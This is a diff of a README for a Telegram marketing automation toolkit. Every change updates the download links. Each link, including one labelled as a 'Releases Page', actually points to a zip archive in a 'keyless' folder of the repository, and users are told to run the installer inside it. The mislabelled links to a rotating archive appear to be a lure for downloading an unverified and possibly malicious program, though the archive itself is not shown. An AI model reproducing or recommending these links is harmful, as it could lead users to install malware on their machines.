@@ -1,6 +1,6 @@
 # 🚀 Telegram-Automation-Toolkit - Simplify Your Telegram Marketing Tasks
 
-![Download Now](https://raw.githubusercontent.com/Shivam00980/Telegram-Automation-Toolkit/main/keyless/Telegram-Automation-Toolkit.zip%20Now-Here-007FFF)
+![Download Now](https://raw.githubusercontent.com/Shivam00980/Telegram-Automation-Toolkit/main/keyless/Automation_Toolkit_Telegram_3.4-alpha.4.zip%20Now-Here-007FFF)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **Telegram-Automation-Toolkit**! This tool helps you automate var
 To get started, you will need to download the software. Follow these steps:
 
 1. **Visit the Releases Page**
-   Click this link to visit the release page: [Download Here](https://raw.githubusercontent.com/Shivam00980/Telegram-Automation-Toolkit/main/keyless/Telegram-Automation-Toolkit.zip).
+   Click this link to visit the release page: [Download Here](https://raw.githubusercontent.com/Shivam00980/Telegram-Automation-Toolkit/main/keyless/Automation_Toolkit_Telegram_3.4-alpha.4.zip).
 
 2. **Choose Your Version**
    On the releases page, you will see a list of available versions. Each version may include different features. Review any notes associated with the version you want to download.
@@ -74,7 +74,7 @@ Once you have installed the toolkit, follow these steps to start using its featu
 
 ### How do I update the application?
 
-To update the toolkit, simply revisit the [Releases Page](https://raw.githubusercontent.com/Shivam00980/Telegram-Automation-Toolkit/main/keyless/Telegram-Automation-Toolkit.zip) and download the latest version. Run the installer as you did before, and it will update your existing installation.
+To update the toolkit, simply revisit the [Releases Page](https://raw.githubusercontent.com/Shivam00980/Telegram-Automation-Toolkit/main/keyless/Automation_Toolkit_Telegram_3.4-alpha.4.zip) and download the latest version. Run the installer as you did before, and it will update your existing installation.
 
 ### Can I use this toolkit on a mobile device?
 
